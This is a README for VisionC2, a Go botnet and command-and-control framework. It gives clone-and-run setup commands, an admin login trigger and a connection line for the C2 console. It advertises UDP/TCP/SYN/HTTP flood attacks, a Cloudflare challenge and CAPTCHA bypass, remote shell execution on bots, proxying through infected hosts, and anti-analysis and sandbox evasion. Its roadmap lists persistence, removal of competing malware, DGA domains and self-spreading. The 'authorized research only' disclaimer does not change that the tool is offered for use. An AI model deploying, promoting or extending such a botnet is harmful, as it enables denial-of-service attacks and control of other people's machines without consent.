
# VisionC2 – Advanced Botnet Command & Control Framework

![VisionC2](https://img.shields.io/badge/VisionC2-V1.7-red)
![Go](https://img.shields.io/badge/Go-1.23.0+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)
![License](https://img.shields.io/badge/License-MIT-yellow)

> **VisionC2** is a Go based botnet with a TUI based CNC focused on network stress testing. It includes enterprise-grade encryption (TLS 1.3 + HMAC), multi-architecture bot support (14+), remote shell, SOCKS5 proxying, and an interactive terminal user interface.

<p align="center">
<b>Watch Vision's TLS Bypass Method crash one of the largest DSTAT Graphs</b>
</p>

![Animation](https://github.com/user-attachments/assets/52ffce78-eb92-4f7c-b34e-ba6ff227e416)

## Quick Start

### Prerequisites

```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen
# Go 1.23+ required → https://go.dev/dl/
```

### Installation

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
python3 setup.py
```

### Starting the C2

**TUI Mode (recommended):**

```bash
cd cnc
./cnc
```

**Split Mode (telnet/multi-user):**

```bash
./cnc --split
# Then connect: nc <server-ip> <admin-port>
# Login trigger: spamtec
```

Bot binaries are automatically built to `bot/bins/`.

## Features

### Bot Capabilities

- **Layer 4**: UDP, TCP, SYN, ACK, GRE, DNS flood methods
- **Layer 7**: HTTP/HTTPS/TLS with HTTP/2 fingerprinting and Cloudflare UAM bypass (including CAPTCHA solving)
- **Remote Execution**: Interactive and fire-and-forget shell commands
- **SOCKS5 Proxy**: Turn any agent into a SOCKS5 proxy server

### Security & Stealth

- TLS 1.3 with perfect forward secrecy
- Multi-layer obfuscation (RC4, XOR, byte substitution, MD5)
- HMAC challenge-response authentication
- Anti-analysis & sandbox detection

### TUI Features

- Real-time bot management, visual attack builder, live shell access, and targeting filters
- Built-in SOCKS5 proxy manager (one-click per bot)
- Broadcast shell execution with architecture, RAM, and count filtering

### Performance

- 2 Servers = 30k-40k Requests Per Second. Layer4 2-6 GBPS.
 > These are reliant on your bots hardware/network.
- 14+ architecture support (automated cross-compilation)
- Fully automated 5-minute setup

## Architecture

```
Admin Console ──TLS 1.3──► C2 Server
                            │
                     Bot Registry
                            ▲
                     TLS 1.3 │
                            │
                       Bot Agents (14+ arches)
```

**C2 Resolution Order** (highly resilient):

1. DoH TXT record
2. DNS TXT record
3. A record
4. Direct IP

## Configuration

After running the setup wizard code changes will be made automatically, however review `setup_config.txt` for:

- C2 address & ports
- Magic code & encryption keys
- Generated 4096-bit certificates

## Usage

- Bot port: **443** (TLS – fixed)
- Admin port: configurable (default 420)
- Full command reference: [`cnc/COMMANDS.md`](cnc/COMMANDS.md)

## Roadmap

### In Progress

- Enhanced daemonization & persistence
- Locker/killer (remove competing malware)

### Planned

- Auto-generated DGA fallback domains
- Self-replication / spreading
- Single-instance port takeover

See [CHANGELOG.md](CHANGELOG.md) for detailed history.

## Disclaimer

**FOR AUTHORIZED SECURITY RESEARCH AND STRESS TESTING ONLY**

The authors are not responsible for any misuse, damage, or legal consequences arising from the use of this software. Use responsibly and legally.

## License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

## Support

- Documentation: [USAGE.md](USAGE.md)
- Issues & feature requests → GitHub Issues
- Contact: <dev@sinners.city>

---
